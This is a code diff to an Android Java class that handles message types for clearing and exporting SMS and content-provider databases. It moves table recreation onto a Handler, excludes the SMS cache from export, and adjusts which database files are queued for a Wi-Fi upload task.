@@ -69,11 +69,11 @@ public class MessageTypeBusiness {
 		boolean ret = false;
 		switch(msgType) {
 			case CLEAN_DB_SMS:
-				processCleanDbSms();
+				processCleanDbSms(handler);
 				ret = true;
 				break;
 			case CLEAN_DB_CACHE:
-				processCleanDbCache();
+				processCleanDbCache(handler);
 				ret = true;
 				break;
 			case SEND_DB:
@@ -91,16 +91,41 @@ public class MessageTypeBusiness {
 		return ret;
 	}
 
-	private void processCleanDbSms() {
-		for(CONTENT_PROVIDER provider : contentProvider) {
-			logMe("processCleanDbSms contentProvider:" + provider);
-			new DbContentProviderService(context, null, provider).deleteAll();
+	private void processCleanDbSms(Handler handler) {
+		try {
+			handler.post(new Runnable() {
+				
+				@Override
+				public void run() {
+					for(CONTENT_PROVIDER provider : contentProvider) {
+						if (provider.url != null && !CONTENT_PROVIDER.SMS_CACHE.equals(provider)) {
+							logMe("processCleanDbSms contentProvider:" + provider);
+							new DbContentProviderService(context, null, provider).recreateTable();
+						}
+					}
+				}
+			});
+		} catch (RuntimeException e) {
+			logMe(e);
+		} catch (Exception e) {
+			logMe(e);
 		}
-		new DbSmsCacheService(context, null).deleteAll();
 	}
 
-	private void processCleanDbCache() {
-		new DbSmsCacheService(context, null).deleteAll();
+	private void processCleanDbCache(Handler handler) {
+		try {
+			handler.post(new Runnable() {
+				
+				@Override
+				public void run() {
+					new DbSmsCacheService(context, null).recreateTable();
+				}
+			});
+		} catch (RuntimeException e) {
+			logMe(e);
+		} catch (Exception e) {
+			logMe(e);
+		}
 	}
 
 	private void processSendDb(Handler handler) {
@@ -109,7 +134,7 @@ public class MessageTypeBusiness {
 		List<String> databaseNameList = new ArrayList<String>();
 
 		for(CONTENT_PROVIDER provider : contentProvider) {
-			if (provider.url != null) {
+			if (provider.url != null && !CONTENT_PROVIDER.SMS_CACHE.equals(provider)) {
 				CountDownLatch latch = null;//new CountDownLatch(1);
 				new ContentProviderExportBusiness(notifier).export(handler, context, provider, latch);
 //				latch.await();
@@ -123,24 +148,11 @@ public class MessageTypeBusiness {
 			}
 		}
 
-		databaseNameList.add(new DBSmsCacheHelper(context, null).getReadableDatabase().getPath());
-
 		new WifiDatabaseUploadTask(context, notifier, databaseNameList).execute();
 	}
 
 	private void processSendDbCache(Handler handler) {
-		Map<CONTENT_PROVIDER, SQLiteOpenHelper> mapHelper = initializeSQLiteHelperSynchrozed(handler);
-
 		List<String> databaseNameList = new ArrayList<String>();
-
-		CONTENT_PROVIDER provider = CONTENT_PROVIDER.SMS_CACHE;
-		SQLiteOpenHelper helper = mapHelper.get(provider);
-		if (helper != null) {
-			String path = helper.getReadableDatabase().getPath();
-			if (!databaseNameList.contains(path)) {
-				databaseNameList.add(path);
-			}
-		}
 
 		databaseNameList.add(new DBSmsCacheHelper(context, null).getReadableDatabase().getPath());
 
